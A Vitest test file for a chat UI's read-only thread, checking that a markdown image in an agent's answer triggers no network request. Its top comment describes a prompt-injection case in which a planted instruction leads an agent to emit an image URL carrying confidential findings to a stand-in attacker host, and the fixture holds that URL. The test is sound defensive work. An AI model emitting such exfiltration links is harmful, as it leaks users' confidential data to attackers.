import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { AssistantRuntimeProvider, useExternalMessageConverter, useExternalStoreRuntime } from '@assistant-ui/react';
import { ReadonlyThread } from '@/components/assistant-ui/readonly-thread';
import { convertChatMessage, type ChatMessage } from '@/lib/chat/turn';
import { flush, renderInto, Rendered } from '@/lib/test-render';

// What a document's planted instruction asks for: an image whose URL carries what the
// agent read. Rendered as an <img>, the browser would send it the moment the answer shows.
const LEAK = 'https://attacker.example/pixel.png?d=confidential-findings';

const HISTORY: ChatMessage[] = [
  { id: 'u1', type: 'human', content: 'Summarise the attached draft' },
  {
    id: 'a1',
    type: 'ai',
    content: [{ type: 'text', text: `The draft argues for a new agency.\n\n![Figure 2](${LEAK})` }],
    tool_calls: [],
  },
];

function Harness() {
  const messages = useExternalMessageConverter({ callback: convertChatMessage, messages: HISTORY, isRunning: false });
  const runtime = useExternalStoreRuntime({ messages, isRunning: false, onNew: async () => {} });
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <ReadonlyThread />
    </AssistantRuntimeProvider>
  );
}

let rendered: Rendered | null = null;

beforeEach(async () => {
  vi.stubGlobal(
    'ResizeObserver',
    class {
      observe() {}
      unobserve() {}
      disconnect() {}
    },
  );
  Element.prototype.scrollIntoView = () => {};
  Element.prototype.scrollTo = () => {};
  rendered = await renderInto(<Harness />);
  await flush();
  await flush();
});

afterEach(async () => {
  await rendered?.unmount();
  rendered = null;
  vi.unstubAllGlobals();
});

describe('an agent answer with a markdown image', () => {
  it('makes no request for it', () => {
    const sources = [...document.querySelectorAll('img')].map((img) => img.getAttribute('src') ?? '');

    expect(document.body.textContent).toContain('The draft argues for a new agency.');
    expect(sources.filter((src) => src.includes('attacker.example'))).toEqual([]);
  });

  it('keeps the alt text, so a figure the agent names is not lost', () => {
    expect(document.body.textContent).toContain('Figure 2');
  });
});
